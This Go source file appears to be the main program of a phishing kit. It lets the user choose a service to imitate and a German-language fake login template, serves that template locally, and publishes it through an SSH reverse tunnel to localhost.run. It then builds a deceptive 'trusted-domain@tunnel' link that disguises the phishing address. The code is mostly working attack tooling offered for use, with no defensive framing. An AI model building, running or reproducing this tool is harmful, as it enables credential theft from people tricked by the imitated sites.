package main

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode"

	"github.com/briandowns/spinner"
	"github.com/fahaik/nophish/constants"
	"github.com/labstack/echo/v4"
)

func serverOne(ctx context.Context, file string) {
	// for {
	select {
	case <-ctx.Done():
		fmt.Println("donerino one")
		return
	default:
		e := echo.New()
		e.Use(echo.WrapMiddleware(NoCache))
		e.GET("/", func(c echo.Context) error {
			c.Response().Header()
			return c.File("templates/de/" + file)
		})
		// e.Static("/", "templates/de/facebook")
		e.HideBanner = true
		e.HidePort = true
		e.Start("127.0.0.1:3000")
	}
	// }
}

func serverTwo(ctx context.Context) {
	// for {
	select {
	case <-ctx.Done():
		fmt.Println("donerino two")
		return
	default:
		e := echo.New()
		e.GET("/", func(c echo.Context) error {
			return c.String(http.StatusOK, "server two")
		})
		e.HideBanner = true
		e.HidePort = true
		e.Start("127.0.0.1:3001")
	}
	// }
}

func RunCmd(ctx context.Context, wg *sync.WaitGroup) error {
	// cmd := exec.Command("ssh", "-R", "80:localhost:3000", "nokey@localhost.run")
	cmd := exec.CommandContext(ctx, "ssh", "-R", "80:localhost:3000", "nokey@localhost.run")
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return err
	}

	wg.Add(1)

	scanner := bufio.NewScanner(stdout)
	go func() {
		for scanner.Scan() {
			// log.Printf("out: %s", scanner.Text())
			ScannedCMD = ScannedCMD + "\n" + scanner.Text()
		}
		wg.Done()
	}()

	if err = cmd.Start(); err != nil {
		return err
	}

	return cmd.Wait()
}

func main() {
	PrintBanner()
	PrintServiceNumbers()
	service := Input(`Pick a service to imitate(i.e. "01"): `, `Has to be of the format "00", "01", etc.`, ValidateServiceNumber)
	i, err := strconv.Atoi(service)
	if err != nil {
		panic(err)
	}

	serviceName := Services[i]
	// fmt.Println(Blue + "[" + White + ">>" + Blue + "] " + serviceName + Reset)
	PrintChoice(serviceName)
	fileNames := GetDirFiles(serviceName)
	Templates = fileNames
	fileNamesPretty := prettyFileNames(fileNames)
	for in, f := range fileNamesPretty {
		number := fmt.Sprintf("%02d", in)
		fmt.Println(constants.Blue + "[" + constants.White + number + constants.Blue + "] " + f + constants.Reset)
	}

	template := Input(`Pick a template by their number: `, `Has to be of the format "00", "01", etc.`, ValidateTemplateExists)
	ind, err := strconv.Atoi(template)
	if err != nil {
		panic(err)
	}
	templateName := Templates[ind]
	// fmt.Println(Blue + "[" + White + ">>" + Blue + "] " + templateName + Reset)
	PrintChoice(templateName)

	domain := Input(`Type in a domain name (i.e. "google.com"): `, `Has to be a non-empty string.`, ValidateDomain)
	// fmt.Println(domain)

	ctx, cancel := context.WithCancel(context.Background())

	go serverOne(ctx, strings.ToLower(serviceName)+"/"+templateName)
	go serverTwo(ctx)
	//////////////////

	var wg sync.WaitGroup
	go RunCmd(ctx, &wg)
	s := spinner.New(spinner.CharSets[14], 100*time.Millisecond) // Build our new spinner
	s.Start()                                                    // Start the spinner
	time.Sleep(4 * time.Second)                                  // Run for some time to simulate work
	s.Stop()
	// fmt.Println(Blue + "[" + White + ">>" + Blue + "] " + "https://www." + domain + "@" + (strings.TrimPrefix(extractURL(ScannedCMD), "https://")) + Reset)
	PrintChoice(domain + "@" + (strings.TrimPrefix(extractURL(ScannedCMD), "https://")))
	// go serverThree(ctx)

	// fmt.Println(URL)
	//////////////////

	// cmd := exec.Command("ssh", "-R", "80:localhost:3000", "nokey@localhost.run")

	key := Input(`Type "q" to finish phishing server and "a" to finish admin panel: `, `Has to be "q" or "a".`, ValidateQorA)
	fmt.Println(key)

	defer func() {
		cancel()
		wg.Wait()
	}()
}

func GetDirFiles(service string) []string {
	files, err := os.ReadDir("templates/de/" + strings.ToLower(service))
	if err != nil {
		log.Fatal(err)
	}
	var fileNames []string
	for _, f := range files {
		fileNames = append(fileNames, f.Name())
	}
	return fileNames
}

func prettyFileNames(files []string) []string {
	var fileNames []string
	for _, f := range files {
		fileNameWithoutHtml, _, _ := strings.Cut(f, ".")
		fileNames = append(fileNames, strings.ReplaceAll(fileNameWithoutHtml, "-", " "))
	}
	return fileNames
}

func SpaceMap(str string) string {
	return strings.Map(func(r rune) rune {
		if unicode.IsSpace(r) {
			return -1
		}
		return r
	}, str)
}

func extractURL(input string) string {
	var url string
	pattern := regexp.MustCompile(`https?://\S+|www\.\S+`)
	urls := pattern.FindAllString(input, -1)

	for _, f := range urls {
		if strings.Contains(f, ".lhr.life") {
			url = f
		}
	}

	return url
	// return pattern.FindAllString(input, -1)
}
